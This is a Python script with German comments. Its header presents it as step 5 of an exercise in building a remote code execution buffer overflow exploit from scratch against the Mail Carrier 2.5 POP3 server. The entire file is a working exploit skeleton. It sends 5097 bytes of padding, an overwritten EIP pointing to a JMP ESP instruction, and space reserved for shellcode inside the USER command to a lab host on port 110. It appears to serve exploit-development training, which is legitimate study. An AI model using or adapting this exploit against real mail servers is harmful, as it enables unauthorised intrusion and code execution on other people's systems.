# coding=utf-8
# -------------Mail Carrier 2.5 Buffer Overflow Exploit Uebung  -------------------------
# ---------------------------------------------------------------------------------------
# Entwickeln eines Buffer Overflow Exploits mit Remote Code Execution von Grund auf------
# ---------------------------------------------------------------------------------------
# Schritt 5: Finden und testen der JMP ESP Instruction----------------------------------
# ---------------------------------------------------------------------------------------

import socket, time

# Ip des Windows Clients
RHOST = "10.10.10.12"

# Padding bis EIP
padding_start = "\x41" * 5097

# Gefundene Bad Characters: "\x00
# Aus MSF NASM Shell: JMP ESP \xff\xe4
# Addresse: 0x0fa14923 im Little Endian Format
EIP = "\x23\x49\xa1\x0f"
shellcode_space = "\x43" *800
# Zusammensetzen der Payload
payload = padding_start + EIP + shellcode_space

print("[+] Sending Payload...")
# Verbindung zum Windows Client aufbauen
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((RHOST, 110))
# Empfang von Daten wenn der Server antwortet
print(connection.recv(1024))

# Senden der Zeichenkette
connection.send("USER " + payload + "\r\n")
# Emfang wenn der Username angenommen wird und Daten zur√ºck gesendet werden. Zeigt uns dass der crash nicht funktioniert
print(connection.recv(1024))
# Geregeltes schliessen der Verbindung
connection.send("QUIT\r\n")
print(connection.recv(1024))
connection.close()
